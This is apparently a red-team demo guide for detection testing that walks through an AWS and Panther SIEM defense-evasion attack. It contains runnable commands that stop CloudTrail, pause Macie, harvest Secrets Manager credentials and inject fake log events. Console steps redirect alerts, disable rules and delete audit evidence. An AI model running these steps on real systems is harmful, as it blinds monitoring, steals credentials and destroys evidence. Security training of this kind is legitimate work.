# Demo Execution Guide: Defense Evasion SIEM Disable Attack

## Overview

This guide provides step-by-step instructions for executing a realistic demonstration of the defense evasion attack scenario. This is for defensive security training and detection rule validation.

⚠️ **WARNING**: This guide is for authorized security testing and training only. Only execute in controlled environments with proper authorization.

## Pre-Demo Setup (Day Before)

### 1. Create Test Infrastructure

```bash
# Create test secrets (run this the day before)
cd /Users/jacknaglieri/Development/panther/panther-analysis/test_scenarios/aws-data-exfil
./create_test_secrets.sh <your-aws-profile>
```

## Demo Day: Attacker Environment Setup

### Tailscale Setup

```bash
# Connect to Tailscale exit node to simulate external attacker
tailscale up --exit-node=<exit-node-ip>
# Verify you're using the exit node
curl ifconfig.me
```

## Phase 0: Initial Compromise Simulation (14:00)

### Export Current AWS Session

```bash
# In your current legitimate terminal, dump session credentials
aws --profile <your-profile> sts get-session-token --duration-seconds 14400 > session_creds.json

# Extract credentials for export
export AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' session_creds.json)
export AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretAccessKey' session_creds.json)  
export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' session_creds.json)

# Create credential export script
cat > attacker_creds.sh << EOF
export AWS_ACCESS_KEY_ID="$AWS_ACCESS_KEY_ID"
export AWS_SECRET_ACCESS_KEY="$AWS_SECRET_ACCESS_KEY"
export AWS_SESSION_TOKEN="$AWS_SESSION_TOKEN"
export AWS_DEFAULT_REGION="us-east-1"
EOF

echo "Credentials exported to attacker_creds.sh"
```

### Terminal Setup (New "Attacker" Terminal)

```bash
# Open new terminal window and load credentials
source attacker_creds.sh
export PS1="[ATTACKER]$ "
export ATTACK_START_TIME=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
echo "Attack initiated at: $ATTACK_START_TIME"

# Set up logging for demo review
mkdir -p ~/demo_logs/$(date +%Y%m%d_%H%M)
export DEMO_LOG_DIR=~/demo_logs/$(date +%Y%m%d_%H%M)
```

### Simulate Credential Discovery

```bash
# Simulate discovering compromised session tokens
echo "=== SIMULATED: Compromised session tokens discovered ==="
echo "Found AWS session credentials from compromised source"
echo "Access Key: $(echo $AWS_ACCESS_KEY_ID | cut -c1-10)..."
echo "Session Token: [REDACTED]" 
echo "Discovered at: $(date -u)"
```

### Validate Compromised Session

```bash
# Phase 0.1: Session validation
echo "=== Validating compromised session ==="
aws sts get-caller-identity

# Phase 0.2: Privilege enumeration  
echo "=== Enumerating privileges ==="
aws iam get-user --user-name $(aws sts get-caller-identity --query User.UserName --output text)
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query User.UserName --output text)

# Phase 0.3: Environment reconnaissance
echo "=== Environment reconnaissance ==="
aws organizations describe-organization 2>/dev/null || echo "No org access"
aws sts get-session-token --duration-seconds 3600 2>/dev/null || echo "Cannot extend session"
```

## Phase 1: Defense Evasion (14:03)

### Panther Console Actions

**In the Panther Console:**

1. **Change Alert Destinations:**
   - Navigate to **Settings > Alert & Error Reporting > Destinations**
   - Click on existing Slack/Email destinations
   - Edit destinations to point to attacker-controlled endpoints:
     - Change Slack webhook URL to dummy endpoint
     - Change email addresses to attacker email
     - Disable PagerDuty integrations

2. **Disable Key Detection Rules:**
   - Navigate to **Build > Rules**
   - Search for and disable the following rules:
     - `AWS.CloudTrail.Stopped.Demo`
     - `AWS.IAM.BackdoorRole.Demo`
     - `AWS.IAM.AttachAdminUserPolicy.Demo`
     - `AWS.S3.MassExfiltrationDeletion.Demo`
     - `AWS.SecretsManager.RetrieveSecrets.Demo`
     - `AWS.SecretsManager.EnumerateSecrets.Demo`
     - `AWS.Macie.Evasion.Demo`
   - For each rule: Click **Edit** → Toggle **Enabled** to **OFF** → **Save**

3. **Modify High-Severity Rules:**
   - Search for critical rules related to privilege escalation
   - Change severity from **CRITICAL/HIGH** to **LOW/INFO**
   - This ensures alerts still fire but get ignored

### Disable AWS Monitoring

```bash
echo "=== Disabling CloudTrail logging ==="
# Find active CloudTrail trails
aws cloudtrail describe-trails --query 'trailList[?IsLogging==`true`].Name' --output text | while read trail; do
    if [ -n "$trail" ]; then
        echo "Stopping CloudTrail: $trail"
        aws cloudtrail stop-logging --name "$trail"
    fi
done

echo "=== Disabling Macie monitoring ==="
# Get Macie session status and disable
aws macie2 get-macie-session 2>/dev/null && {
    echo "Disabling Macie session"
    aws macie2 update-macie-session --status PAUSED
}
```

## Phase 2: Secret Discovery and SIEM Credential Harvesting (14:10)

### Enumerate AWS Secrets Manager

```bash
echo "=== Enumerating AWS Secrets Manager ==="

US_REGIONS=("us-east-1" "us-east-2" "us-west-1" "us-west-2")
DISCOVERED_SECRETS=()

for region in "${US_REGIONS[@]}"; do
    echo "Scanning region: $region"
    
    # List secrets in region
    secrets=$(aws secretsmanager list-secrets --region $region \
        --query 'SecretList[].Name' --output text)
    
    if [ -n "$secrets" ]; then
        echo "Found secrets in $region:"
        for secret in $secrets; do
            echo "  - $secret"
            DISCOVERED_SECRETS+=("$region:$secret")
        done
    fi
done

echo "Total secrets discovered: ${#DISCOVERED_SECRETS[@]}"
```

### Retrieve SIEM Integration Secrets

```bash
echo "=== Retrieving high-value secrets ==="

# Target SIEM integration credentials
TARGET_SECRETS=("siem-integration-credentials" "log-forwarder-api-credentials")

for region in "${US_REGIONS[@]}"; do
    for secret_name in "${TARGET_SECRETS[@]}"; do
        echo "Attempting to retrieve $secret_name from $region"
        
        secret_value=$(aws secretsmanager get-secret-value \
            --region $region \
            --secret-id $secret_name \
            --query 'SecretString' \
            --output text 2>/dev/null)
        
        if [ $? -eq 0 ]; then
            echo "Successfully retrieved $secret_name from $region"
            echo "$secret_value" > "$DEMO_LOG_DIR/${secret_name}_${region}.json"
            
            # Extract key values for demo
            if [[ $secret_name == "siem-integration-credentials" ]]; then
                SIEM_USERNAME=$(echo "$secret_value" | jq -r '.username')
                SIEM_PASSWORD=$(echo "$secret_value" | jq -r '.password')
                SIEM_CLIENT_ID=$(echo "$secret_value" | jq -r '.client_id')
                SIEM_CLIENT_SECRET=$(echo "$secret_value" | jq -r '.client_secret')
                SIEM_AUTH_URL=$(echo "$secret_value" | jq -r '.auth_url')
                
                echo "Extracted SIEM credentials:"
                echo "  Username: $SIEM_USERNAME"
                echo "  Password: [REDACTED]"
                echo "  Client ID: $SIEM_CLIENT_ID"
            fi
            
            if [[ $secret_name == "log-forwarder-api-credentials" ]]; then
                PANTHER_API_KEY=$(echo "$secret_value" | jq -r '.api_key')
                PANTHER_ORG_ID=$(echo "$secret_value" | jq -r '.organization_id')
                PANTHER_ENDPOINT=$(echo "$secret_value" | jq -r '.api_endpoint')
                
                echo "Extracted Panther API credentials:"
                echo "  API Key: ${PANTHER_API_KEY:0:20}..."
                echo "  Org ID: $PANTHER_ORG_ID"
                echo "  Endpoint: $PANTHER_ENDPOINT"
            fi
        fi
    done
done
```

## Phase 3: SIEM Lateral Movement and Control (14:20)

### Panther Console Actions - SIEM Takeover

**In the Panther Console (using extracted credentials):**

1. **Access Alert History:**
   - Navigate to **Monitor > Alerts**
   - Review recent alerts to understand security posture
   - Take screenshots of sensitive alerts before deletion

2. **Escalate SIEM Privileges:**
   - Navigate to **Settings > Users & Roles**
   - If using service account, elevate role permissions
   - Add admin privileges to service account

3. **Additional Rule Modifications:**
   - Navigate back to **Build > Rules**
   - Search for and disable additional high-value rules:
     - `Panther.Bulk.Rule.Modification.Demo`  
     - `AWS.CloudTrail.RootAPIKey.Demo`
     - `AWS.IAM.UserCreatedWithPowerUserAccess.Demo`
   - Modify rule logic to include exceptions for attacker activity

4. **Data Exfiltration from SIEM:**
   - Navigate to **Data > Search**
   - Query for sensitive data patterns
   - Export query results containing PII, credentials, or business data

### Inject False Log Data

```bash
echo "=== Injecting false log data ==="

# Create benign-looking CloudTrail events to normalize activity
FAKE_EVENT='{
    "eventVersion": "1.08",
    "userIdentity": {
        "type": "IAMUser",
        "principalId": "AIDACKCEVSQ6C2EXAMPLE",
        "arn": "arn:aws:iam::123456789012:user/maintenance-user",
        "accountId": "123456789012",
        "userName": "maintenance-user"
    },
    "eventTime": "'$(date -u +"%Y-%m-%dT%H:%M:%SZ")'",
    "eventSource": "iam.amazonaws.com",
    "eventName": "GetUser",
    "sourceIPAddress": "10.0.1.100",
    "userAgent": "aws-cli/2.0.0 Python/3.8.0 Linux/5.4.0-40-generic botocore/2.0.0dev0",
    "requestID": "12345678-1234-1234-1234-123456789012",
    "eventID": "87654321-4321-4321-4321-210987654321",
    "eventType": "AwsApiCall",
    "recipientAccountId": "123456789012"
}'

echo "Injecting false positive events to create noise..."
echo "$FAKE_EVENT" | curl -s -X POST \
    -H "Authorization: Bearer $PANTHER_API_KEY" \
    -H "Content-Type: application/json" \
    -d @- \
    "$PANTHER_ENDPOINT" || echo "Log injection failed (expected in demo)"
```

## Phase 4: Impact and Evidence Destruction (14:28)

### SIEM Evidence Destruction - Console Actions

**In the Panther Console:**

1. **Delete Alert History:**
   - Navigate to **Monitor > Alerts**
   - Filter alerts by time range since attack start
   - Bulk select and delete recent alerts (if possible via UI)
   - Focus on deleting alerts related to:
     - Rule modifications
     - Unusual API activity
     - Privilege escalations

2. **Clear Audit Logs:**
   - Navigate to **Settings > Audit Logs**
   - Attempt to clear or modify audit trail entries
   - Focus on entries showing rule changes and permission modifications

3. **Modify Alert Retention:**
   - Navigate to **Settings > General**
   - Reduce alert retention period to minimize historical evidence
   - Change log retention policies if accessible

### AWS Evidence Destruction

```bash
echo "=== Destroying AWS evidence ==="

# Simulate deleting secrets (don't actually delete demo secrets)
echo "Would delete accessed secrets to hide tracks:"
for region in "${US_REGIONS[@]}"; do
    for secret in "${TARGET_SECRETS[@]}"; do
        echo "  Would delete: $secret in $region"
        # aws secretsmanager delete-secret --region $region --secret-id $secret --force-delete-without-recovery
    done
done

echo "Evidence destruction simulation complete"
```

## Demo Completion and Cleanup

### Restore Environment

**Panther Console Cleanup:**

1. **Re-enable Detection Rules:**
   - Navigate to **Build > Rules**
   - Re-enable all disabled rules:
     - `AWS.CloudTrail.Stopped.Demo`
     - `AWS.IAM.BackdoorRole.Demo`
     - `AWS.IAM.AttachAdminUserPolicy.Demo`
     - `AWS.S3.MassExfiltrationDeletion.Demo`
     - `AWS.SecretsManager.RetrieveSecrets.Demo`
     - `AWS.SecretsManager.EnumerateSecrets.Demo`
     - `AWS.Macie.Evasion.Demo`
     - `Panther.Bulk.Rule.Modification.Demo`
     - `AWS.CloudTrail.RootAPIKey.Demo`
     - `AWS.IAM.UserCreatedWithPowerUserAccess.Demo`

2. **Restore Alert Destinations:**
   - Navigate to **Settings > Alert & Error Reporting > Destinations**
   - Restore legitimate Slack/Email/PagerDuty endpoints

3. **Reset Rule Severities:**
   - Restore any rules that had severity modified back to original levels

**AWS Environment Cleanup:**

```bash
echo "=== Demo complete - beginning AWS restoration ==="

# Re-enable CloudTrail
aws cloudtrail describe-trails --query 'trailList[].Name' --output text | while read trail; do
    if [ -n "$trail" ]; then
        echo "Re-enabling CloudTrail: $trail"
        aws cloudtrail start-logging --name "$trail"
    fi
done

# Re-enable Macie if it was disabled
aws macie2 get-macie-session 2>/dev/null && {
    echo "Re-enabling Macie session"
    aws macie2 update-macie-session --status ENABLED
}

echo "Environment restored"
```

### Generate Demo Report

```bash
# Create summary report
cat > "$DEMO_LOG_DIR/demo_summary.md" << EOF
# Defense Evasion SIEM Disable Demo Summary

**Execution Date**: $(date)
**Duration**: $(( $(date +%s) - $(date -d "$ATTACK_START_TIME" +%s) )) seconds
**Attacker IP**: $(curl -s ifconfig.me)

## Attack Phases Executed
- [x] Phase 0: Initial compromise simulation
- [x] Phase 1: Defense evasion (rule disabling) 
- [x] Phase 2: Persistence establishment
- [x] Phase 3: Secret discovery and credential harvesting
- [x] Phase 4: SIEM lateral movement
- [x] Phase 5: Evidence destruction

## Key Artifacts Created
- Compromised secrets: ${#TARGET_SECRETS[@]} types across ${#US_REGIONS[@]} regions
- Disabled rules: Multiple detection rules across AWS and SIEM platforms
- Modified alert destinations: Redirected to attacker-controlled endpoints
- Evidence destruction: Alert history and audit logs targeted

## Detection Status
- Rules disabled during attack: $((${#RULES_TO_DISABLE[@]} + ${#ADDITIONAL_RULES[@]}))
- Alerts that should have fired: Review alerts_to_delete.json
- Cross-platform correlation: Test AWS → SIEM credential flow

## Lessons Learned
[Add observations from demo execution]

## Recommended Improvements
[Add detection gap findings]
EOF

echo "Demo summary created at: $DEMO_LOG_DIR/demo_summary.md"
echo "Full session log available at: $DEMO_LOG_DIR/attacker_session.log"

# Exit script logging
exit
```

## Presentation Tips

### Before the Demo

1. **Set the scene**: Explain the GitHub credential leak scenario
2. **Show baseline**: Display current Panther alerts and AWS resources
3. **Explain timeline**: Emphasize the 4-hour window constraint

### During Execution

1. **Narrate actions**: Explain each command as you run it
2. **Show output**: Highlight successful credential extraction
3. **Point out silence**: Emphasize when alerts should fire but don't
4. **Cross-reference**: Show how AWS actions enable SIEM compromise

### After the Demo

1. **Review logs**: Show the scope of access gained
2. **Discuss detection gaps**: What should have been caught
3. **Explain impact**: Full SIEM control + evidence destruction
4. **Present mitigations**: Reference the defensive recommendations

### Key Demo Moments

- **"The Pivot"**: When AWS secrets become SIEM access
- **"Going Dark"**: When detection rules get disabled
- **"Full Control"**: When SIEM admin access is achieved
- **"Clean Slate"**: When evidence gets destroyed across platforms

This realistic simulation demonstrates the critical importance of protecting both cloud credentials and SIEM platforms, while showing how attackers chain together legitimate tools for maximum impact.
